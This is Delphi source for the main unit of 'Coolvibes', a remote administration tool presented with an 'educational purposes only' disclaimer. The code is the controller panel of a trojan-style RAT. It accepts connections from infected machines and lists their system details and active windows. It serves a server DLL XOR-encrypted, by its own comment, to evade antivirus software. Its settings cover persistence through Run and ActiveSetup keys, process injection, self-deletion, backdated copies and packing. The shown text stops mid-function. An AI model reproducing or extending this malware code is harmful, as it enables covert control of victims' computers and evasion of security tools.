(*  Coolvibes - Herramienta de administración remota

   Este código fuente se ofrece sólo con fines educativos.
   Queda absolutamente prohibido ejecutarlo en computadores
   cuyo dueño sea una persona diferente de usted, a no ser
   que el dueño haya dado permiso explicito de usarlo.

   En cualquier caso, ni www.indetectables.net  ni ninguno de
   los creadores de Coolvibes será responsable de cualquier
   consecuencia de usar este programa. Si no acepta esto por
   favor no compile el programa y borrelo ahora mismo.

   El equipo del Coolvibes
*)

unit UnitMain;

interface

uses
  Windows, ShellAPI, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, XPMan, ScktComp, ComCtrls, Buttons, StdCtrls, ImgList, jpeg,
  Menus, IniFiles, IdThreadMgr, IdThreadMgrDefault, IdAntiFreezeBase,
  IdAntiFreeze, IdBaseComponent, IdComponent, IdTCPServer,
  UnitFormControl,
  UnitVariables,
  UnitFormNotifica, AppEvnts;

const
  WM_POP_MESSAGE = WM_USER + 1;  //Mensaje usado para las notificaciones
  WM_ICONTRAY  = WM_USER + 2;  //Mensaje usado para el icono en el system tray
  // globo emergente
  NIF_INFO     = $10;
  NIF_MESSAGE  = 1;
  NIF_ICON     = 2;
  NOTIFYICON_VERSION = 3;
  NIF_TIP      = 4;
  NIM_SETVERSION = $00000004;
  NIM_SETFOCUS = $00000003;
  NIIF_INFO    = $00000001;
  NIIF_WARNING = $00000002;
  NIIF_ERROR   = $00000003;

type
  TDUMMYUNIONNAME = record
    case integer of
      0: (uTimeout: UINT);
      1: (uVersion: UINT);
  end;

  TNotifyIconData = record
    cbSize:  DWORD;
    Wnd:     HWND;
    uID:     UINT;
    uFlags:  UINT;
    uCallbackMessage: UINT;
    hIcon:   HICON;
    szTip:   array [0..127] of char;
    dwState: DWORD;
    dwStateMask: DWORD;
    szInfo:  array [0..255] of char;
    DUMMYUNIONNAME: TDUMMYUNIONNAME;
    szInfoTitle: array [0..63] of char;
    dwInfoFlags: DWORD;
  end;
//termina const globo emergente
type
  TFormMain = class(TForm)
    StatusBar: TStatusBar;
    XPManifest: TXPManifest;
    ImageTitulo: TImage;
    BtnEscuchar: TSpeedButton;
    PopupMenuConexiones: TPopupMenu;
    Abrir1: TMenuItem;
    N1:     TMenuItem;
    Ping1:  TMenuItem;
    Cambiarnombre1: TMenuItem;
    ImageList: TImageList;
    BtnOpciones: TSpeedButton;
    BtnAbout: TSpeedButton;
    ListViewConexiones: TListView;
    BtnConfigServer: TSpeedButton;
    ServerSocket: TIdTCPServer;
    IdAntiFreeze1: TIdAntiFreeze;
    IdThreadMgrDefault1: TIdThreadMgrDefault;
    PopupMenuTray: TPopupMenu;
    MostrarOcultar1: TMenuItem;
    Acercade1: TMenuItem;
    N2:     TMenuItem;
    Escuchar1: TMenuItem;
    Salir1: TMenuItem;
    N3:     TMenuItem;
    wwwindetectablesnet1: TMenuItem;
    NotificacinestiloMSN1: TMenuItem;
    TimerMandarPing: TTimer;
    procedure BtnEscucharClick(Sender: TObject);
    procedure ListViewConexionesContextPopup(Sender: TObject;
      MousePos: TPoint; var Handled: boolean);
    procedure Abrir1Click(Sender: TObject);
    procedure BtnOpcionesClick(Sender: TObject);
    procedure BtnAboutClick(Sender: TObject);
    procedure Cambiarnombre1Click(Sender: TObject);
    procedure Ping1Click(Sender: TObject);
    procedure LeerArchivoINI();
    procedure GuardarArchivoINI();
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure BtnConfigServerClick(Sender: TObject);
    procedure ServerSocketConnect(AThread: TIdPeerThread);
    procedure ServerSocketExecute(AThread: TIdPeerThread);
    procedure ServerSocketDisconnect(AThread: TIdPeerThread);
    procedure ListViewConexionesColumnClick(Sender: TObject; Column: TListColumn);
    procedure ListViewConexionesCompare(Sender: TObject;
      Item1, Item2: TListItem; Data: integer; var Compare: integer);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure MostrarOcultar1Click(Sender: TObject);
    procedure Salir1Click(Sender: TObject);
    procedure NotificacinestiloMSN1Click(Sender: TObject);
    procedure PopupMenuTrayPopup(Sender: TObject);
    procedure wwwindetectablesnet1Click(Sender: TObject);
    procedure TimerMandarPingTimer(Sender: TObject);
    procedure ListViewConexionesColumnRightClick(Sender: TObject;
      Column: TListColumn; Point: TPoint);
    procedure PopupMenuConexionesPopup(Sender: TObject);
    procedure GloboEmergente(titulo:string;mensaje:string;tipo:cardinal);
  private
    ColumnaOrdenada, Columna: integer;
    //Para saber por que columna está ordenado el listviewconexiones
    TrayIconData: TNotifyIconData;
    //El record dodne se guarda la información del icono de la tray
    procedure OnPopMessage(var Msg: TMessage); message WM_POP_MESSAGE;
    procedure TrayMessage(var Msg: TMessage); message WM_ICONTRAY;
    procedure NotiMsnDesconect(tItem: TListItem);
  public
    Columnas : array[0..8] of string; //Para saber el orden de las columnas
    NotificandoOnline: Boolean; //Si estamos notificando alguna conexión
    procedure FormCloseQuery(Sender: TObject; var CanClose: boolean);
    procedure FormCloseQueryMinimizarAlTray(Sender: TObject; var CanClose: boolean);
    procedure MinimizeToTrayClick(Sender: TObject);
    function  buscaridcolumnapornombre(nombre:string):integer;
  end;

var
  FormMain: TFormMain;
  PrimeraVezQueMeMuestro: boolean = True;
  ServDLL : String; //DLL del server, coolserver.dll

implementation

uses UnitOpciones, UnitAbout, UnitID, UnitFormConfigServer,
  UnitColumnasManager;

{$R *.dfm}


procedure TFormMain.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  GuardarArchivoINI();
  if ServerSocket.Active then
    BtnEscuchar.Click;
  Shell_NotifyIcon(NIM_DELETE, @TrayIconData);
  exitprocess(0);
end;

procedure TFormMain.FormCloseQuery(Sender: TObject; var CanClose: boolean);
begin
  case MessageBox(handle, '¿Está seguro que desea salir?', 'Confirmación',
      mb_IconQuestion + Mb_YesNo) of
    idNo: CanClose := False;
  end;
end;

procedure TFormMain.FormCloseQueryMinimizarAlTray(Sender: TObject;
  var CanClose: boolean);
begin
  MinimizeToTrayClick(Sender);
  CanClose := False;
end;
//Fin de eventos del Formulario

//Eventos de los botones del Formulario
procedure TFormMain.BtnConfigServerClick(Sender: TObject);
begin
  FormConfigServer.Show;
end;

procedure TFormMain.BtnOpcionesClick(Sender: TObject);
begin
  FormOpciones.ShowModal();
end;

procedure TFormMain.BtnAboutClick(Sender: TObject);
begin
  if (FormAbout.Showing <> true) then
  FormAbout.ShowModal;
end;

procedure TFormMain.BtnEscucharClick(Sender: TObject);
var
  h:    TBitmap;
  i:    integer;
  List: TList;
  Athread: TidPeerThread;
begin
  if BtnEscuchar.Caption = 'Escuchar' then
  begin
    try
      ServerSocket.DefaultPort := StrToIntdef(FormOpciones.EditPuerto.Text,80);
      ServerSocket.Active := True;
      FormOpciones.EditPuerto.Enabled := False;
      BtnEscuchar.Caption := 'Detener';
      Escuchar1.Checked := True;
    except
      MessageDlg('El puerto ' + FormOpciones.EditPuerto.Text +
        ' ya está en uso o hay un firewall bloqueándolo, elija otro', mtWarning, [mbOK], 0);
    end;
    try
      h := TBitmap.Create;
      h.LoadFromFile(ExtractFilePath(ParamStr(0)) + 'Recursos\Imagenes\detener.bmp');
      BtnEscuchar.Glyph := h;

    except
      MessageDlg('No se puede cargar la imagen: ' + ExtractFilePath(ParamStr(0)) +
        'Recursos\Imagenes\detener.bmp', mtWarning, [mbOK], 0);
    end;
    h.Free;

    StatusBar.Panels[0].Text := 'Esperando conexiones';
    StatusBar.Panels[1].Text := 'Puerto: ' + FormOpciones.EditPuerto.Text;
  end
  else
  begin
    List := ServerSocket.Threads.LockList;
    for i := 0 to List.Count - 1 do
    begin
      Athread := TidPeerThread(List.Items[i]);
      if Athread.Connection.Connected then
      begin
        Athread.Suspend;
        Athread.Connection.Disconnect;
        Athread.FreeOnTerminate := True;
        Athread.Terminate;
        List[i] := nil;
        Athread := nil;
      end;
    end;
    ServerSocket.Threads.Clear;
    ServerSocket.Threads.UnlockList;
    ServerSocket.Active := False;
    ServerSocket.Bindings.Clear;
    ListViewConexiones.Clear;
    FormOpciones.EditPuerto.Enabled := True;
    BtnEscuchar.Caption := 'Escuchar';
    Escuchar1.Checked   := False;
    try
      h := TBitmap.Create;
      h.LoadFromFile(ExtractFilePath(ParamStr(0)) + 'Recursos\Imagenes\escuchar.bmp');
      BtnEscuchar.Glyph := h;
    except
      MessageDlg('No se puede cargar la imagen: ' + ExtractFilePath(ParamStr(0)) +
        'Recursos\Imagenes\escuchar.bmp', mtWarning, [mbOK], 0);
    end;
    h.Free;
    StatusBar.Panels[0].Text := 'Escucha detenida';
  end;
end;
//Fin de los eventos de los botones del Formulario

//Evento que se ejecuta al recibir el mensaje WM_POP_MESSAGE, para las notificaciones
procedure TFormMain.OnPopMessage(var Msg: TMessage);
var
  item: TListItem;
  VentanaNotifica: TFormNotifica;
  i:    integer;
begin
  item := TListItem(Msg.Wparam);
  if not NotificandoOnline then
  begin
    NotificandoOnline := True;
    VentanaNotifica := TFormNotifica.Create(self, Item);
    VentanaNotifica.Show;
    VentanaNotifica.Timer.Enabled := True;
  end;
end;

//Eventos del ServerSocket
procedure TFormMain.ServerSocketConnect(AThread: TIdPeerThread);
begin
  AThread.Connection.MaxLineLength := 1024 * 1024; //Long Max linea
  AThread.Connection.WriteLn('MAININFO|' + IntToStr(Athread.Handle));
end;

procedure TFormMain.ServerSocketDisconnect(AThread: TIdPeerThread);
var
  item: TListItem;
begin
  if Athread.Data <> nil then
  begin
    item := TListItem(Athread.Data);
    //cerrar la  ventana del item correspondiente
    if item.SubItems.Objects[1] <> nil then
    begin
      (item.SubItems.Objects[1] as TFormControl).Close;
    end;
    if NotiMsnServerDesc then
    begin
      // si la opcion esta checkeado mandamos al globo emergente el item
      NotiMsnDesconect(item);
    end;
    TListItem(Athread.Data).Delete;

  end;
  try
    ServerSocket.Threads.LockList.Remove(Athread);
  finally
    ServerSocket.Threads.UnlockList();
  end;

  StatusBar.Panels[0].Text := 'Numero de conexiones: '+inttostr(Listviewconexiones.Items.count);
end;

function TFormMain.buscaridcolumnapornombre(nombre:string):integer; //devuelve el id de una columna conociendo su caption
var
  i : integer;
begin
  Result := -1;
  for i:= 0 to listviewconexiones.columns.count-1 do
       if Listviewconexiones.Column[i].Caption = nombre then
          Result := i-1;
end;

procedure TFormMain.ServerSocketExecute(AThread: TIdPeerThread);
var
  Len, i, Ping: integer;
  item:   TListItem;
  Buffer: ansistring;
  Recibido, IP: string;
  SHP:    HWND;
  TmpServDLL : string;
begin
  try
    Buffer := Trim(Athread.Connection.ReadLn);
  except
    Athread.Connection.Disconnect;
    exit;
  end;
  Len := Length(Buffer);

  if Buffer = 'CONNECTED?' then
    Exit  //Lo ignoramos
  else if Buffer = 'PING' then
  begin
    Athread.Connection.WriteLn('PONG');
  end
    else if Copy(Buffer, 1, 9) = 'GETSERVER' then         //conectador.dll nos está pidiendo el servidor
  begin                           //GETSERVER|clavecifrado1|clavecifrado2|
   Recibido := buffer;
   Delete(Recibido, 1, Pos('|', Recibido)); //quitamos el GETSERVER|

  //Globo emergente de intento de conexión ??
    TmpServDLL := ServDll;
    if NotificacionMsn then //solo si está activa la notificación MSN de lo contrario podría molestar
      GloboEmergente('Pidiendo Servidor', 'Pidiendo Servidor', NIIF_INFO);
    for i := 1 to length(ServDLL) do  //con la primera clave
      TmpServDLL[i] := chr(ord(TmpServDLL[i]) xor strtoint(Copy(Recibido, 1, Pos('|', Recibido) - 1)));//funcion de cifrado simple para evadir antiviruses
    Delete(Recibido, 1, Pos('|', Recibido));
    for i := 1 to length(ServDLL) do
      TmpServDLL[i] := chr(ord(TmpServDLL[i]) xor strtoint(Copy(Recibido, 1, Pos('|', Recibido) - 1)));//funcion de cifrado simple para evadir antiviruses


    Athread.Connection.Write(#14+inttostr(length(TmpServDLL))+#14+TmpServDLL);
  end
  else if Copy(Buffer, 1, 4) = 'PONG' then
  begin
  item := TListItem(Athread.Data);
  Ping := GetTickCount() - cardinal(Item.SubItems.Objects[2]); //Tiempo actual menos almacenado


    case Ping of
      0..50: item.ImageIndex    := 3; //Ping perfecto
      51..100: item.ImageIndex  := 4; //Ping bueno
      101..300: item.ImageIndex := 5; //Ping regular
      else
        item.ImageIndex := 6; //Ping malo
    end;

    Recibido := Buffer;
    Delete(Recibido, 1, Pos('|', Recibido)); //quitamos el PONG
    for i := 1 to 8 do
    begin
      Delete(Recibido, 1, Pos('|', Recibido));
       if(buscaridcolumnapornombre(Columnas[i]) <> -1) then
          Item.SubItems[buscaridcolumnapornombre(columnas[i])] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
    end;
    if(buscaridcolumnapornombre(Columnas[5]) <> -1) then
      item.SubItems[buscaridcolumnapornombre(Columnas[5])] := IntToStr(Ping);

    Exit;
  end;

  //Buscamos a que item corresponde la conexión
  for i := 0 to ListViewConexiones.Items.Count - 1 do
    if Athread.Handle = TIdPeerThread(ListViewConexiones.Items[i].SubItems.Objects[0]).Handle then
    begin
      item := ListViewConexiones.Items[i];
      //Enviarle la conexión a la ventana de ese item, si la tiene
      if item.SubItems.Objects[1] <> nil then
      begin
        (item.SubItems.Objects[1] as TFormControl).OnRead(Buffer, Athread);
        Exit;
      end;
      exit;
    end;

  {Si llega aquí es que el SocketHandle no se encontró entre los SocketHandles
   de las conexiones principales y una de dos:
   -Es un nuevo server
   -Es una conexión para la transferencia de ficheros}

  {Es un nuevo servidor, recibimos la información principal del server
   para mostrar en el ListViewConexiones}
  if Copy(Buffer, 1, 8) = 'MAININFO' then
  begin
    //Añadimos el server al ListviewConexiones
    item := ListViewConexiones.Items.Add;
    item.ImageIndex := 3;
    item.Caption := Athread.Connection.Socket.Binding.PeerIP;
    item.SubItems.Add(' ');
    item.SubItems.Add(' ');
    item.SubItems.Add(' ');
    item.SubItems.Add(' ');
    item.SubItems.Add(' ');
    item.SubItems.Add(' ');
    item.SubItems.Add(' ');
    item.SubItems.Add(' ');
    //El primer Objeto que guardamos en el Item es el Athread
    item.SubItems.Objects[0] := Athread;
    //Como segundo objeto guardaremos la Form
    //Y el tercer objeto le usaremos para guardar el TimeCount del ping
    Athread.Data := item;
    Recibido     := Copy(PChar(Buffer), 1, len);
    Delete(Recibido, 1, 9);  //Borramos MAININFO|
    IP := '[' + Item.Caption + ']';
    Item.Caption := Item.Caption + '/' + Copy(Recibido, 1, Pos('|', Recibido) - 1);


    for i := 1 to 8 do  //El resto de valores los copiamos tal cual
    begin
      Delete(Recibido, 1, Pos('|', Recibido));
       if(buscaridcolumnapornombre(Columnas[i]) <> -1) then
          Item.SubItems[buscaridcolumnapornombre(columnas[i])] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
    end;
    //    AThread.Connection.WriteLn('GETSH|'+IntToStr(AThread.Handle));
    //Mostramos la notificación
    if NotificacionMsn then
      SendMessage(FormMain.Handle, WM_POP_MESSAGE, integer(Item), 0);
  end
  {Si llega aquí es que es una conexión de transferencia, con SH|12345, se recibe el SocketHandle
  que relacciona esta conexión de transferencia con la conexión principal}
  else if Copy(PChar(Buffer), 1, 2) = 'SH' then
  begin
    Recibido := Copy(PChar(Buffer), 1, len);
    Delete(Recibido, 1, 3); // 'SH|12345'
    //En recibido tenemos el SocketHandle de la conexión principal
    SHP := HWND(StrToInt(Recibido));
    //Buscamos el item de la conexión principal y le añadimos el Handle del socket para las transferencias
    for i := 0 to ListViewConexiones.Items.Count - 1 do
      if SHP = TIdPeerThread(ListViewConexiones.Items.Item[i].SubItems.Objects[0]).Handle then
      begin
        item := ListViewConexiones.Items[i];
        //Enviarle la conexión a la ventana de ese item, si la tiene
        if item.SubItems.Objects[1] <> nil then
        begin
          (item.SubItems.Objects[1] as TFormControl).OnReadFile(Athread);
        end;
        exit;
      end;
  end;

   StatusBar.Panels[0].Text := 'Numero de conexiones: '+inttostr(Listviewconexiones.Items.count);
end;
//Fin de eventos del ServerSocket

procedure TFormMain.ListViewConexionesContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: boolean);
begin
  if ListViewConexiones.Selected = nil then
    //No se ha seleccionado item, deshabilitar menu
  begin
    PopupMenuConexiones.Items[0].Enabled := False;
    PopupMenuConexiones.Items[2].Enabled := False;
    PopupMenuConexiones.Items[3].Enabled := False;
  end
  else
  begin
    PopupMenuConexiones.Items[0].Enabled := True;
    PopupMenuConexiones.Items[2].Enabled := True;
    PopupMenuConexiones.Items[3].Enabled := True;
  end;
end;

//Al dar al boton abrir
procedure TFormMain.Abrir1Click(Sender: TObject);
var
  NuevaVentanaControl: TFormControl;
  AThread: TIdPeerThread;
begin
  if ListViewConexiones.Selected = nil then
    Exit;

  if ListViewConexiones.Selected.SubItems.Objects[1] <> nil then
    TFormControl(ListViewConexiones.Selected.SubItems.Objects[1]).Show
  else
  begin
    Athread := TIdPeerThread(ListViewConexiones.Selected.SubItems.Objects[0]);
    NuevaVentanaControl := TFormControl.Create(self, Athread);
    NuevaVentanaControl.PageControl.ActivePage := NuevaVentanaControl.TabServidor;
    ListViewConexiones.Selected.SubItems.Objects[1] := NuevaVentanaControl;
    if(buscaridcolumnapornombre(Columnas[1]) <> -1) then
    begin
      NuevaVentanaControl.Caption :=
      'Centro de control: ' + ListViewConexiones.Selected.SubItems[buscaridcolumnapornombre(columnas[1])] +
      ' ' + Athread.Connection.Socket.Binding.PeerIP;
      NuevaVentanaControl.NombrePC := ListViewConexiones.Selected.SubItems[buscaridcolumnapornombre(columnas[1])];
    end;
    NuevaVentanaControl.Show;
  end;
end;

procedure TFormMain.Ping1Click(Sender: TObject);
var
  i: integer;
  AThread: TIdPeerThread;
begin
if(listviewconexiones.selected.SubItems[buscaridcolumnapornombre(Columnas[5])] <> '.') then
begin
    AThread := TidPeerThread(ListViewConexiones.Selected.SubItems.Objects[0]);
    AThread.Connection.WriteLn('PING');
    //Como objeto 2 guardamos una captura del tiempo en milisegundos
    ListViewConexiones.Selected.SubItems.Objects[2] := TObject(GetTickCount());
end;
end;

procedure TFormMain.Cambiarnombre1Click(Sender: TObject);
begin
  FormID.Show;
end;

//Al pulsar en la columna del ListViewConexiones ordenar filas según el valor de esa columna
procedure TFormMain.ListViewConexionesColumnClick(Sender: TObject; Column: TListColumn);
begin
  Columna := Column.Index;
  ListViewConexiones.AlphaSort;
  //Para acordarnos de que columna está ordenada
  if Columna <> ColumnaOrdenada then
    ColumnaOrdenada := Columna
  else
    ColumnaOrdenada := -1;
end;

//Para ordenar el ListViewConexiones
procedure TFormMain.ListViewConexionesCompare(Sender: TObject;
  Item1, Item2: TListItem; Data: integer; var Compare: integer);
var
  Str1, Str2: string;
begin
  if Columna = 0 then  //Si Columna = 0 usar Item.Caption
  begin
    Str1 := Item1.Caption;
    Str2 := Item2.Caption;
  end
  else
  begin       //Si Columna > 0 usar Item.SubItems[Columna -1]
    Str1 := Item1.SubItems[Columna - 1];
    Str2 := Item2.SubItems[Columna - 1];
  end;
  if Columna in [0..4] then  //Son tratadas como cadenas
    Compare := CompareText(Str1, Str2)
  else  //Columna 5 tratada como número
    Compare := StrToIntDef(Str1, 0) - StrToIntDef(Str2, 0);
  //Si la columna ya fue ordenada anteriormente, invertir el orden
  if Columna = ColumnaOrdenada then
    Compare := Compare * -1; //Invertimos el resultado
end;

//Funciones para leer y guardar la configuración en el archivo .INI
procedure TFormMain.LeerArchivoINI();
var
  Ini     : TIniFile;
  i       : integer;
  c       : TListColumn;
  TempStr : string;
begin
  try
    Ini := TIniFile.Create(ExtractFilePath(ParamStr(0)) + 'Configuracion.ini');

    //Valores de la Form de Opciones
    with FormOpciones do
    begin
      EditPuerto.Text :=
        Ini.ReadString('Opciones', 'PuertoEscucha', '3360');
      CheckBoxPreguntarAlSalir.Checked :=
        Ini.ReadBool('Opciones', 'PreguntarSalir', True);
      CheckBoxNotificacionMsn.Checked :=
        Ini.ReadBool('Opciones', 'NotificacionMsn', True);
      CheckBoxNotiMsnDesc.Checked :=
        Ini.ReadBool('Opciones', 'NotiMsnServerDesc', True);
      NotificacionMsn :=
        Ini.ReadBool('Opciones', 'NotificacionMsn', True);
      CheckBoxMinimizeToTray.Checked :=
        Ini.ReadBool('Opciones', 'MinimizarAlTray', False);
      CheckBoxCloseToTray.Checked :=
        Ini.ReadBool('Opciones', 'CerrarAlTray', False);
      CheckBoxEscucharAlIniciar.Checked :=
        Ini.ReadBool('Opciones', 'EscucharAlIniciar', False);
      CheckBoxMandarPingAuto.Checked :=
        Ini.ReadBool('Opciones', 'MandarPingAuto', True);
      EditPingTimerInterval.Text :=
        Ini.ReadString('Opciones', 'PingTimerInterval', '30');
      CheckBoxAutoRefrescar.Checked :=
        Ini.ReadBool('Opciones', 'AutoRefrescar', False);
    end;
    //Valores de la Form de Configuracion del server
    with FormConfigServer do
    begin
      EditID.Text     :=
        Ini.ReadString('ConfigurarServidor', 'ID', 'CoolID');
      IPsyPuertos     :=
        Ini.ReadString('ConfigurarServidor', 'Conectar', '127.0.0.1:80¬');
      EditPluginName.Text :=
        Ini.ReadString('ConfigurarServidor', 'NombrePlugin', '0k3n.dat');
      CheckBoxCopiar.Checked :=
        Ini.ReadBool('ConfigurarServidor', 'CopiarArchivo', False);
      EditFileName.Text :=
        Ini.ReadString('ConfigurarServidor', 'NombreArchivo', 'coolserver.exe');
      EditCopyTo.Text :=
        Ini.ReadString('ConfigurarServidor', 'RutaCopiarA', '%AppDir%\');
      CheckBoxMelt.Checked :=
        Ini.ReadBool('ConfigurarServidor', 'Melt', False);
      CheckBoxCopiarConFechaAnterior.Checked :=
        Ini.ReadBool('ConfigurarServidor', 'CopiarConFechaAnterior', False);
      CheckBoxRun.Checked :=
        Ini.ReadBool('ConfigurarServidor', 'MetodoRun', False);
      CheckBoxActiveSetup.Checked :=
        Ini.ReadBool('ConfigurarServidor', 'MetodoActiveSetup', False);
      EditRunName.Text :=
        Ini.ReadString('ConfigurarServidor', 'ValorRun', 'coolserver');
      EditActiveSetup.Text :=
        Ini.ReadString('ConfigurarServidor', 'ValorActiveSetup', '');
      CheckBoxInyectar.Checked :=
        Ini.ReadBool('ConfigurarServidor', 'Inyectar', False);
      CheckBoxPersistencia.Checked :=
        Ini.ReadBool('ConfigurarServidor', 'Persistencia', False);
      CheckBoxUPX.Checked :=
        Ini.ReadBool('ConfigurarServidor', 'ComprimirUPX', False);
      CheckBoxCifrar.Checked :=
        Ini.ReadBool('ConfigurarServidor', 'Cifrar', False);

    end;

    Listviewconexiones.columns.Clear;
    Columnas[0] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre0', 'IP');
    Columnas[1] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre1', 'Nombre');
    Columnas[2] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre2', 'CPU');
    Columnas[3] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre3', 'SO');
    Columnas[4] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre4', 'Versión');
    Columnas[5] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre5', 'Ping');
    Columnas[6] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre6', 'Ventana activa');
    Columnas[7] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre7', 'TSU');
    Columnas[8] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre8', 'Encendido hace');

    for i:=0 to 8 do
    begin
       if Ini.ReadBool('AparienciaCliente', 'Columna'+inttostr(i)+'Mostrandose', true) then
       begin
          c := Listviewconexiones.columns.Add;
          c.Caption:= Ini.ReadString('AparienciaCliente', 'Columna'+inttostr(i)+'Caption', columnas[i]);
          c.width := Ini.ReadInteger('AparienciaCliente', 'Columna'+inttostr(i)+'Width',100);
       end;
    end;

    self.Width := Ini.ReadInteger('AparienciaCliente', 'FormMainWidth',self.Width);
    self.Height := Ini.ReadInteger('AparienciaCliente', 'FormMainHeight',self.Height);

  finally
    Ini.Free;
  end;
  FormOpciones.BtnGuardar.Click;
end;

procedure TFormMain.GuardarArchivoINI();
var
  Ini: TIniFile;
  i:   integer;
  TempStr : string;
begin
  try
    Ini := TIniFile.Create(ExtractFilePath(ParamStr(0)) + 'Configuracion.ini');

    //Valores de la Form de Opciones
    Ini.WriteString('Opciones', 'PuertoEscucha', FormOpciones.EditPuerto.Text);
    Ini.WriteBool('Opciones', 'PreguntarSalir',
      FormOpciones.CheckBoxPreguntarAlSalir.Checked);
    Ini.WriteBool('Opciones', 'MinimizarAlTray',
      FormOpciones.CheckBoxMinimizeToTray.Checked);
    Ini.WriteBool('Opciones', 'CerrarAlTray', FormOpciones.CheckBoxCloseToTray.Checked);
    Ini.WriteBool('Opciones', 'NotificacionMsn',
      FormOpciones.CheckBoxNotificacionMsn.Checked);
    Ini.WriteBool('Opciones', 'NotiMsnServerDesc',
      FormOpciones.CheckBoxNotiMsnDesc.Checked);
    Ini.WriteBool('Opciones', 'MandarPingAuto',
      FormOpciones.CheckBoxMandarPingAuto.Checked);
    Ini.WriteBool('Opciones', 'EscucharAlIniciar',
      FormOpciones.CheckBoxEscucharAlIniciar.Checked);
    Ini.WriteString('Opciones', 'PingTimerInterval', FormOpciones.EditPingTimerInterval.text);
    Ini.WriteBool('Opciones', 'AutoRefrescar',
      FormOpciones.CheckBoxAutoRefrescar.Checked);
    //Valores de la Form de Configuracion del server
    Ini.WriteString('ConfigurarServidor', 'ID', FormConfigServer.EditID.Text);
    Ini.WriteString('ConfigurarServidor', 'Conectar', FormConfigServer.ipsypuertos);
    Ini.WriteString('ConfigurarServidor', 'NombrePlugin',
      FormConfigServer.EditPluginName.Text);
    Ini.WriteBool('ConfigurarServidor', 'CopiarArchivo',
      FormConfigServer.CheckBoxCopiar.Checked);
    Ini.WriteString('ConfigurarServidor', 'NombreArchivo',
      FormConfigServer.EditFileName.Text);
    Ini.WriteString('ConfigurarServidor', 'RutaCopiarA',
      FormConfigServer.EditCopyTo.Text);
    Ini.WriteBool('ConfigurarServidor', 'Melt', FormConfigServer.CheckBoxMelt.Checked);
    Ini.WriteBool('ConfigurarServidor', 'CopiarConFechaAnterior',
      FormConfigServer.CheckBoxCopiarConFechaAnterior.Checked);
    Ini.WriteBool('ConfigurarServidor', 'MetodoRun',
      FormConfigServer.CheckBoxRun.Checked);
    Ini.WriteString('ConfigurarServidor', 'ValorRun',
      FormConfigServer.EditRunName.Text);
    Ini.WriteBool('ConfigurarServidor', 'MetodoActiveSetup',
      FormConfigServer.CheckBoxActiveSetup.Checked);
    Ini.WriteString('ConfigurarServidor', 'ValorActiveSetup',
      FormConfigServer.EditActiveSetup.Text);
    Ini.WriteBool('ConfigurarServidor', 'Inyectar',
      FormConfigServer.CheckBoxInyectar.Checked);
    Ini.WriteBool('ConfigurarServidor', 'Persistencia',
      FormConfigServer.CheckBoxPersistencia.Checked);
    Ini.WriteBool('ConfigurarServidor', 'ComprimirUPX',
      FormConfigServer.CheckBoxUPX.Checked);
    Ini.WriteBool('ConfigurarServidor', 'Cifrar',
      FormConfigServer.CheckBoxCifrar.Checked);


      //Guardamos el estado de las columnas del Tlistview :D
      for i:=0 to 8 do
        Ini.WriteBool('AparienciaCliente', 'Columna'+inttostr(i)+'Mostrandose', false);//ponemos todas como ocultas

      for i:=0 to Listviewconexiones.columns.Count-1 do
      begin
        Ini.WriteBool('AparienciaCliente', 'Columna'+inttostr(i)+'Mostrandose', true);
        Ini.WriteString('AparienciaCliente', 'Columna'+inttostr(i)+'Caption', Listviewconexiones.columns[i].Caption);
        Ini.WriteInteger('AparienciaCliente', 'Columna'+inttostr(i)+'Width',Listviewconexiones.columns[i].Width);
      end;



    Ini.WriteString('AparienciaCliente', 'ColumnaNombre0', Columnas[0]);
    Ini.WriteString('AparienciaCliente', 'ColumnaNombre1', Columnas[1]);
    Ini.WriteString('AparienciaCliente', 'ColumnaNombre2', Columnas[2]);
    Ini.WriteString('AparienciaCliente', 'ColumnaNombre3', Columnas[3]);
    Ini.WriteString('AparienciaCliente', 'ColumnaNombre4', Columnas[4]);
    Ini.WriteString('AparienciaCliente', 'ColumnaNombre5', Columnas[5]);
    Ini.WriteString('AparienciaCliente', 'ColumnaNombre6', Columnas[6]);
    Ini.WriteString('AparienciaCliente', 'ColumnaNombre7', Columnas[7]);
    Ini.WriteString('AparienciaCliente', 'ColumnaNombre8', Columnas[8]);
    Ini.WriteInteger('AparienciaCliente', 'FormMainHeight',self.Height);
    Ini.WriteInteger('AparienciaCliente', 'FormMainWidth',self.Width);


  finally
    Ini.Free;
  end;
end;
//Termina Archivo .INI

procedure TFormMain.FormCreate(Sender: TObject);
var
  ServerFile             : File;
  Tamano                 : integer;
  i                      : integer;
begin
  Application.OnMinimize := MinimizeToTrayClick;

  //Inicializar el icono de la TrayBar
  TrayIconData.cbSize := SizeOf(TrayIconData);
  TrayIconData.Wnd    := Handle;
  TrayIconData.uID    := 0;
  TrayIconData.uFlags := NIF_MESSAGE + NIF_ICON + NIF_TIP;
  TrayIconData.uCallbackMessage := WM_ICONTRAY;//el mensaje que deberemos interceptar
  TrayIconData.hIcon  := Application.Icon.Handle;
  StrPCopy(TrayIconData.szTip, 'Coolvibes ' + VersionCool);

  Shell_NotifyIcon(NIM_ADD, @TrayIconData);

  Self.Caption := 'Coolvibes '+VersionCool+' Update '+UpdateNum+' ::   [ www.indetectables.net ]';

  if fileexists(extractfiledir(paramstr(0))+'\Recursos\coolserver.dll')      then
  begin

    FileMode := 0;
    AssignFile(ServerFile, extractfiledir(paramstr(0))+'\Recursos\coolserver.dll');     //archivo de CoolServer
    Reset(ServerFile, 1);
    tamano := FileSize(ServerFile);
    SetLength(Servdll, tamano);
    BlockRead(ServerFile, Servdll[1], tamano);  //cargado archivo a servdll
    CloseFile(ServerFile);



  end
  else
